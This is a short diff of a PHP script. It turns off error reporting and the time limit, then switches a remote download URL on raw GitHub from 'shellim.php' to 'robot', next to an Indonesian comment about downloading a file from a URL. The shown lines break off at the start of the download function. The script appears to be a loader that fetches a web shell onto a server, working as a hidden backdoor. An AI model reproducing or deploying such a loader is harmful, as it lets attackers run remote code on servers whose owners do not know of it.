@@ -4,7 +4,7 @@ set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
 
-$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/shellim.php';
+$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/robot';
 
 // Fungsi untuk download file dari URL
 function fetch_from_url($url) {
